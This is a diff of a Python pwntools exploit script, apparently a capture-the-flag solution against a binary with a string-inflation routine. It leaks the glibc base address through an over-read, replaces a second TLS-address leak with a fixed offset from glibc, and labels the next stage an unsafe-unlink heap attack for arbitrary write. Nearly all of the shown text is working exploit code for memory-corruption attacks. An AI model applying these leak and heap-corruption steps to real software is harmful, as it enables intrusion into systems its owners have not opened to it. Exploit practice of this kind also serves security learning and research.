@@ -69,10 +69,8 @@ flate_string(b'24a10000b')
 p.recvuntil(b"a"*24)
 glibc_base_addr = u64(p.recvline().strip().ljust(8, b"\x00"))-0xad7e2
 log.info(f"glibc base address: {hex(glibc_base_addr)}")
-# 63rd qword of output string has a fixed offset from tls base address
-flate_string(b"496a10000b")
-p.recvuntil(b"a"*496)
-tls_base_addr = u64(p.recvline().strip().ljust(8, b"\x00"))-0x33596
+# tls base address has a fixed offset from glibc base address
+tls_base_addr = glibc_base_addr-0x28c0
 log.info(f"tls base address: {hex(tls_base_addr)}")
 
 # Stage 2: unsafe unlink to get arbitrary write
